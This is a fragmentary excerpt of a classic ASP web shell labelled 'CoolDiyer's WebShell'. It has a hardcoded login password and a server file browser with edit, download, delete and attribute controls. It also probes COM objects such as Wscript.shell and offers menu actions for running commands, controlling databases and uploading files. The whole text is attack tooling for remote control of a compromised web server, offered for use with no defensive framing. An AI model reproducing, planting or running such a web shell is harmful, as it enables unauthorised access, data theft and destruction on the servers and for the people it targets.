...
If Request("Action") = "Login" Then
    If Request.Form("Pass") = "thunder" Then 'Replace You Password
...
%>
	<DIV width=450 align=center>
	  <FORM action=<%=Url%>?Action=ScServer method=Post>Special Info Query:
...
Sub CommonObj() 'Common COM Test
	Message "Current COM Info","<LI>Scripting.FileSystemObject:" & GetObj("Scripting.FileSystemObject") & "<LI>ADODB.Connection:" & GetObj("ADODB.Connection") &	"<LI>FileUp.upload:" & GetObj("FileUp.upload") & "<LI>JJMail.SMtPMail:" & GetObj("JMail.SMtPMail") & "<LI>CDONTS.NewMail:" & GetObj("CDONTS.NewMail") &	"<LI>Wscript.shell:" & GetObj("Wscript.shell"),0
	%>
	<DIV width=450 align=center>
	  <FORM action=<%=Url%>?Action=ScObj method=Post>Special COM Query:
...
<DIV align=center>
  <FORM Action=<%=Url%>?Action=ScFolder method=Post>Appoint Folder Query:
...
%>
<%
	oldFolder = Trim(Request("oldFolder")) 'Start
  ...
  <TR>
    <TD colspan=2>
	  <TABLE width=100% border=0 cellpadding=3 cellspacing=1>
	    <TR>
		  <TD align=middle><b><FONT color=#ff2222>CoolDiyer's WebShell</FONT><b></TD>
		</TR>
  ...
  <TR>
    <TD>
	  <TABLE width=100% border=0 cellpadding=0 cellspacing=1>
	    <TR>
		  <TD width=30% valign=top bgcolor=#ecfccd>
		    <TABLE width=100% border=0 cellpadding=3 cellspacing=0>
			  <TR>
			    <TD>
				  <A href=<%=Url%>?Path=<%=GetoldFolder(oldFolder)%>&oldFolder=<%=GetoldFolder(oldFolder)%>><FONT color=#FF8000><font face=Webdings>2</font></FONT><font face=Webdings>9</font><FONT color=#ff2222>Higher level Dir</FONT></A><BR>
				  <%
				  For Each SubFolderB in SubFolderA%>
				  <A href=<%=Url%>?Path=<%=Server.UrlEncode(SubFolderB.Path & "\")%>&oldFolder=<%=GetoldFolder(SubFolderB.Path)%> title="<%=GetAttrib(SubFolderB.attrib) & Chr(10) & "Modify Time" & SubFolderB.DateLastModified%>">+<FONT color=#FF8000><font face=Webdings>2</font></FONT><%=SubFolderB.Name%></A><FONT color=#ff2222><font face=Webdings>r</font></FONT>
				  <A href=<%=Url%>?Action=Del&name=<%=Server.Urlencode(SubFolderB.Path)%>&flag=2 target=_blank onclick="return Delyn()">Del</A>
				  <A href=#CopyFolder onclick="Copy('<%=Server.Urlencode(SubFolderB.Path)%>',2)">Copy</A>
				  <A href=<%=Url%>?Action=SetAttribForm&FileFolder=<%=Server.UrlEncode(SubFolderB.Path)%> target=_blank>attrib</A><BR>
				  <%
				  Next%>
				</TD>
			  </TR>
		  ...
		  <TD valign=top bgcolor=#ecfccd height=320>
		    <TABLE TABLE width=100% border=0 cellpadding=2 cellspacing=0>
			  ...
			  <TR>
				...
				<%If WebPath <> "" Then%><A href="<%=WebPath & FileB.Name%>" title="<%=GetAttrib(FileB.attrib) & Chr(10) & "Modify Time:" & FileB.DateLastModified%>" target=_blank><%=FileB.Name%></A></TD><%Else%><FONT title="<%=GetAttrib(FileB.attrib) & Chr(10) & "Modify Time:" & FileB.DateLastModified%>"><%=FileB.Name%></FONT></TD><%End If%>
				<TD class=TBBO><%=FileB.Size%> byte</TD>
				<TD align=middle class=TBBO>
				  <A href=<%=Url%>?Action=EditForm&File=<%=Server.Urlencode(FileB.Path)%> target=_blank>Edit</A>
				  <A href=# onclick="Copy('<%=Server.Urlencode(FileB.Path)%>',1)">Copy</A>
				  <A href=<%=Url%>?Action=Down&File=<%=Server.Urlencode(FileB.Path)%> target=_blank>Down</A>
				  <A href=<%=Url%>?Action=Del&name=<%=Server.Urlencode(FileB.Path)%>&flag=1 target=_blank onclick="return Delyn()">Del</A>
				  <A href=<%=Url%>?Action=SetAttribForm&FileFolder=<%=Server.Urlencode(FileB.Path)%> target=_blank>attrib</A>
				</TD>
			  </TR>
			  <%
			  Next%>
		...
		<TR>
		  <TD colspan=2 class=TBTD>&nbsp;Other Operate
		    <A href=<%=Url%>?Action=ShowServer target=_blank>[View Server Info]</A>
			<A href=<%=Url%>?Action=CommonObj target=_blank>[Query Server COM]</A>
			<A href=<%=Url%>?Action=ScanDriveForm target=_blank>[Scan Disk Info]</A>
			<A href=<%=Url%>?Action=DispFsoCmdForm target=_blank>[Exucute CMD without FSO]</A>
			<A href=<%=Url%>?Action=SQLForm target=_blank>[Control DataBase]</A>
			<A href=<%=Url%>?Action=UpLoadForm  target=_blank>[Upload without COM]</A>
		  </TD>
		</TR>
